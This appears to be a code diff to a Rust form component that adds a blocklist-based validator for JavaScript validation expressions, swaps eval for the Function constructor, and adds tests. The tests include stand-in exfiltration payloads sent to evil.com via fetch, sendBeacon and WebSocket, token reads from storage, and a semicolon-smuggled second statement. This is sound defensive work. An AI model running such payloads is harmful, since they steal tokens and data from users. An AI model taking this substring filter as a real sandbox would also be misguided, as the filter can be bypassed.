@@ -97,6 +97,178 @@ pub struct FormComponent {
 	method: String,
 }
 
+/// Dangerous patterns that indicate code injection attempts in validation expressions.
+///
+/// These patterns are blocked because validation expressions should only contain
+/// simple comparison and property access logic, not arbitrary code execution.
+const DANGEROUS_JS_PATTERNS: &[(&str, &str)] = &[
+	("eval(", "eval() is not allowed in validation expressions"),
+	("eval (", "eval() is not allowed in validation expressions"),
+	(
+		"Function(",
+		"Function constructor is not allowed in validation expressions",
+	),
+	(
+		"Function (",
+		"Function constructor is not allowed in validation expressions",
+	),
+	(
+		"import(",
+		"Dynamic import is not allowed in validation expressions",
+	),
+	(
+		"import (",
+		"Dynamic import is not allowed in validation expressions",
+	),
+	(
+		"require(",
+		"require() is not allowed in validation expressions",
+	),
+	(
+		"require (",
+		"require() is not allowed in validation expressions",
+	),
+	("fetch(", "fetch() is not allowed in validation expressions"),
+	(
+		"fetch (",
+		"fetch() is not allowed in validation expressions",
+	),
+	(
+		"XMLHttpRequest",
+		"XMLHttpRequest is not allowed in validation expressions",
+	),
+	(
+		"document.",
+		"DOM access is not allowed in validation expressions",
+	),
+	(
+		"window.",
+		"window access is not allowed in validation expressions",
+	),
+	(
+		"globalThis.",
+		"globalThis access is not allowed in validation expressions",
+	),
+	(
+		"self.",
+		"self access is not allowed in validation expressions",
+	),
+	(
+		"navigator.",
+		"navigator access is not allowed in validation expressions",
+	),
+	(
+		"location.",
+		"location access is not allowed in validation expressions",
+	),
+	(
+		"localStorage",
+		"localStorage is not allowed in validation expressions",
+	),
+	(
+		"sessionStorage",
+		"sessionStorage is not allowed in validation expressions",
+	),
+	(
+		"cookie",
+		"cookie access is not allowed in validation expressions",
+	),
+	(
+		"setTimeout",
+		"setTimeout is not allowed in validation expressions",
+	),
+	(
+		"setInterval",
+		"setInterval is not allowed in validation expressions",
+	),
+	(
+		"WebSocket",
+		"WebSocket is not allowed in validation expressions",
+	),
+	(
+		"__proto__",
+		"prototype manipulation is not allowed in validation expressions",
+	),
+	(
+		"constructor",
+		"constructor access is not allowed in validation expressions",
+	),
+	(
+		"prototype",
+		"prototype access is not allowed in validation expressions",
+	),
+];
+
+/// Validate a JavaScript expression for safe evaluation in form validation context.
+///
+/// This function rejects expressions containing dangerous patterns that could
+/// enable code injection, DOM manipulation, network access, or prototype pollution.
+/// Only simple comparison and property access expressions are allowed.
+///
+/// # Arguments
+///
+/// * `expression` - JavaScript expression to validate
+///
+/// # Returns
+///
+/// `Ok(())` if the expression is safe, `Err(String)` describing the violation otherwise.
+///
+/// # Examples
+///
+/// ```ignore
+/// use reinhardt_pages::form::component::validate_js_expression;
+///
+/// // Safe expressions
+/// assert!(validate_js_expression("value.length >= 8").is_ok());
+/// assert!(validate_js_expression("value !== ''").is_ok());
+///
+/// // Dangerous expressions
+/// assert!(validate_js_expression("eval('alert(1)')").is_err());
+/// assert!(validate_js_expression("fetch('http://evil.com')").is_err());
+/// ```
+pub fn validate_js_expression(expression: &str) -> Result<(), String> {
+	// Reject empty expressions
+	if expression.trim().is_empty() {
+		return Err("Empty expression is not allowed".to_string());
+	}
+
+	// Block statement-like constructs (semicolons indicate multiple statements)
+	if expression.contains(';') {
+		return Err(
+			"Semicolons are not allowed in validation expressions (use single expressions only)"
+				.to_string(),
+		);
+	}
+
+	// Block assignment operators (but allow === and !==)
+	// Check for = that is not preceded or followed by = or !
+	let bytes = expression.as_bytes();
+	for (i, &byte) in bytes.iter().enumerate() {
+		if byte == b'=' {
+			let prev = if i > 0 { bytes[i - 1] } else { 0 };
+			let next = if i + 1 < bytes.len() { bytes[i + 1] } else { 0 };
+
+			// Allow ==, ===, !=, !==, >=, <=
+			if prev == b'=' || prev == b'!' || prev == b'>' || prev == b'<' || next == b'=' {
+				continue;
+			}
+
+			return Err(
+				"Assignment operators are not allowed in validation expressions".to_string(),
+			);
+		}
+	}
+
+	// Check for dangerous patterns
+	for (pattern, description) in DANGEROUS_JS_PATTERNS {
+		if expression.contains(pattern) {
+			return Err(description.to_string());
+		}
+	}
+
+	Ok(())
+}
+
 impl FormComponent {
 	/// Create a new FormComponent from metadata
 	///
@@ -442,6 +614,9 @@ impl FormComponent {
 	/// should only contain simple validation logic and must not access external APIs.
 	#[cfg(target_arch = "wasm32")]
 	fn evaluate_js_expression(&self, field_name: &str, expression: &str) -> Result<bool, String> {
+		// Validate expression against allowlist before evaluation
+		validate_js_expression(expression)?;
+
 		// Get field value
 		let value = self.get_value(field_name);
 
@@ -454,8 +629,12 @@ impl FormComponent {
 			expression
 		);
 
-		// Evaluate the expression
-		let result = js_sys::eval(&safe_code).map_err(|e| format!("JS eval error: {:?}", e))?;
+		// Evaluate the expression using Function constructor instead of eval
+		// Function constructor creates a new scope, preventing access to local variables
+		let func = Function::new_no_args(&format!("return ({});", safe_code));
+		let result = func
+			.call0(&JsValue::NULL)
+			.map_err(|e| format!("JS eval error: {:?}", e))?;
 
 		// Convert to boolean
 		result
@@ -485,6 +664,9 @@ impl FormComponent {
 		field_names: &[String],
 		expression: &str,
 	) -> Result<bool, String> {
+		// Validate expression against allowlist before evaluation
+		validate_js_expression(expression)?;
+
 		// Collect field values
 		let all_values = self.collect_field_values();
 
@@ -503,8 +685,11 @@ impl FormComponent {
 			expression
 		);
 
-		// Evaluate the expression
-		let result = js_sys::eval(&safe_code).map_err(|e| format!("JS eval error: {:?}", e))?;
+		// Evaluate the expression using Function constructor instead of eval
+		let func = Function::new_no_args(&format!("return ({});", safe_code));
+		let result = func
+			.call0(&JsValue::NULL)
+			.map_err(|e| format!("JS eval error: {:?}", e))?;
 
 		// Convert to boolean
 		result
@@ -759,10 +944,144 @@ mod tests {
 	use super::*;
 	use reinhardt_forms::Widget;
 	use reinhardt_forms::wasm_compat::{FieldMetadata, FormMetadata};
+	use rstest::rstest;
 	use std::collections::HashMap;
 
-	#[test]
+	// =========================================================================
+	// JS Expression Validation Tests (Issue #2622)
+	// =========================================================================
+
+	#[rstest]
+	#[case("value.length >= 8", "length check")]
+	#[case("value !== ''", "non-empty check")]
+	#[case("value.trim().length > 0", "trimmed length check")]
+	#[case("value >= 0 && value <= 100", "range check")]
+	#[case("fields.password === fields.password_confirm", "cross-field equality")]
+	fn test_validate_js_expression_allows_safe_expressions(
+		#[case] expression: &str,
+		#[case] _desc: &str,
+	) {
+		// Arrange & Act
+		let result = validate_js_expression(expression);
+
+		// Assert
+		assert!(
+			result.is_ok(),
+			"Expression '{}' should be allowed but was rejected: {:?}",
+			expression,
+			result.err()
+		);
+	}
+
+	#[rstest]
+	#[case("eval('alert(1)')", "eval")]
+	#[case("eval ('alert(1)')", "eval with space")]
+	#[case("Function('return 1')()", "Function constructor")]
+	#[case("fetch('http://evil.com')", "fetch")]
+	#[case("document.cookie", "document access")]
+	#[case("window.location", "window access")]
+	#[case("globalThis.eval", "globalThis access")]
+	#[case("navigator.sendBeacon('http://evil.com', data)", "navigator access")]
+	#[case("localStorage.getItem('token')", "localStorage access")]
+	#[case("sessionStorage.getItem('token')", "sessionStorage access")]
+	#[case("setTimeout(fn, 0)", "setTimeout")]
+	#[case("setInterval(fn, 1000)", "setInterval")]
+	#[case("new WebSocket('ws://evil.com')", "WebSocket")]
+	#[case("XMLHttpRequest", "XMLHttpRequest")]
+	#[case("import('malicious-module')", "dynamic import")]
+	#[case("require('fs')", "require")]
+	#[case("obj.__proto__.polluted", "prototype pollution via __proto__")]
+	#[case("obj.constructor.prototype", "prototype pollution via constructor")]
+	fn test_validate_js_expression_rejects_dangerous_patterns(
+		#[case] expression: &str,
+		#[case] _desc: &str,
+	) {
+		// Arrange & Act
+		let result = validate_js_expression(expression);
+
+		// Assert
+		assert!(
+			result.is_err(),
+			"Expression '{}' should be rejected but was allowed",
+			expression,
+		);
+	}
+
+	#[rstest]
+	fn test_validate_js_expression_rejects_empty() {
+		// Arrange & Act
+		let result = validate_js_expression("");
+
+		// Assert
+		assert!(result.is_err());
+	}
+
+	#[rstest]
+	fn test_validate_js_expression_rejects_semicolons() {
+		// Arrange - semicolons enable multi-statement injection
+		let expression = "value.length >= 8; fetch('http://evil.com')";
+
+		// Act
+		let result = validate_js_expression(expression);
+
+		// Assert
+		assert!(result.is_err());
+	}
+
+	#[rstest]
+	fn test_validate_js_expression_rejects_assignment() {
+		// Arrange - assignment operators can modify state
+		let expression = "value = 'hacked'";
+
+		// Act
+		let result = validate_js_expression(expression);
+
+		// Assert
+		assert!(result.is_err());
+	}
+
+	#[rstest]
+	fn test_validate_js_expression_allows_comparison_operators() {
+		// Arrange & Act & Assert - comparison operators (==, ===, !=, !==, >=, <=)
+		assert!(validate_js_expression("value == 'test'").is_ok());
+		assert!(validate_js_expression("value === 'test'").is_ok());
+		assert!(validate_js_expression("value != 'test'").is_ok());
+		assert!(validate_js_expression("value !== 'test'").is_ok());
+		assert!(validate_js_expression("value >= 0").is_ok());
+		assert!(validate_js_expression("value <= 100").is_ok());
+	}
+
+	#[rstest]
+	fn test_validate_js_expression_rejects_self_access() {
+		// Arrange
+		let expression = "self.fetch('http://evil.com')";
+
+		// Act
+		let result = validate_js_expression(expression);
+
+		// Assert
+		assert!(result.is_err());
+	}
+
+	#[rstest]
+	fn test_validate_js_expression_rejects_location_access() {
+		// Arrange
+		let expression = "location.href = 'http://evil.com'";
+
+		// Act
+		let result = validate_js_expression(expression);
+
+		// Assert
+		assert!(result.is_err());
+	}
+
+	// =========================================================================
+	// FormComponent Tests (Existing)
+	// =========================================================================
+
+	#[rstest]
 	fn test_form_component_creation() {
+		// Arrange
 		let metadata = FormMetadata {
 			fields: vec![FieldMetadata {
 				name: "username".to_string(),
@@ -780,15 +1099,17 @@ mod tests {
 			non_field_errors: Vec::new(),
 		};
 
+		// Act
 		let component = FormComponent::new(metadata, "/api/submit");
 
+		// Assert
 		assert_eq!(component.action, "/api/submit");
 		assert_eq!(component.method, "POST");
 		assert_eq!(component.values.len(), 1);
 		assert!(component.values.contains_key("username"));
 	}
 
-	#[test]
+	#[rstest]
 	fn test_form_component_validation_required_field() {
 		let metadata = FormMetadata {
 			fields: vec![FieldMetadata {
@@ -824,7 +1145,7 @@ mod tests {
 		assert!(errors.is_empty());
 	}
 
-	#[test]
+	#[rstest]
 	fn test_form_component_get_set_value() {
 		let metadata = FormMetadata {
 			fields: vec![FieldMetadata {
@@ -851,7 +1172,7 @@ mod tests {
 		assert_eq!(component.get_value("name"), "John Doe");
 	}
 
-	#[test]
+	#[rstest]
 	fn test_form_component_with_initial_values() {
 		let mut initial = HashMap::new();
 		initial.insert("username".to_string(), serde_json::json!("john_doe"));
